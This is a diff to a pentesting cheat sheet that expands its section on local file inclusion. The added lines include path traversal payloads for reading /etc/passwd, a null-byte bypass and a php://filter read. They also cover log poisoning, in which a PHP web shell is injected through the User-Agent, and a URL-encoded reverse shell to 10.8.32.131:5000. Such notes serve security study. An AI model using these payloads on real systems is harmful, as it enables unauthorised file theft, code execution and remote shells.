@@ -198,8 +198,27 @@ IDOR stands for Insecure Direct Object Reference. It is a kind of access control
 
 ### LFI & RFI
 
-LFI stands for Local File Inclusion, which is a technique where an attacker tricks a web application to retrieve a specific file from the system through a bad sanitized input form or query. It happens, for example, when requesting `http://targetsite.com/get.php?file=userCV.pdf`. If the "get.php" script is bad designed, a malicious user could force `http://targetsite.com/get.php?file=/etc/passwd`, getting all users on the system. LFI exploits PHP functions such as **include**, **require**, **include_once** and **require_once**.
+LFI stands for Local File Inclusion, which is a technique where an attacker tricks a web application to retrieve a specific file from the system through a bad sanitized input form or query. It happens, for example, when requesting `http://targetsite.com/get.php?file=userCV.pdf`. If the "get.php" script is bad designed, a malicious user could force `http://targetsite.com/get.php?file=/etc/passwd`, getting all users on the system. LFI exploits PHP functions such as **include**, **require**, **include_once** and **require_once**. You must test out the URL parameter by adding the `dot-dot-slash` notation.
 
+- Check `http://targetsite.com/get.php?file=../../../../etc/passwd` and similar queries. Generally the target is figuring out where is the "get.php" script executed because the Path Traversal (../../../.. ecc) starts from there.
+- If the PHP script makes use of `$_GET['param']."ext"`, you could try to bypass it by means of the null character %00 at the end of the URL (ex. `http://targetsite.com/get.php?file=../../../../etc/passwd%00`). **Solved since PHP 5.4**. 
+- Check Wrapper "php://filter" for encoding and decoding a target file: `http://targetsite.com/get.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`. For all Wrappers have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+
+#### LFI-2-RCE
+
+This means getting command execution on target exploiting LFI. 
+
+- If an Apache server is vulnerable to LFI then you can access to `/var/log/apache2/access.log`. Check what are the Request Header parameters stored in the log (eg. User Agent) and then replace one of them with `<?php system($_GET['cmd']); ?>`. Next time you will access to the log file through LFI, the log file will be executed and so does the php injected script. You should then send a query like this:
+
+      http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=whoami
+      
+      Or, you could spawn a reverse shell:
+      
+      http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.8.32.131%22%2C5000)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
+
+Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`
+      
+This is also known as **Log poisoning**
 
 ### SSRF
 
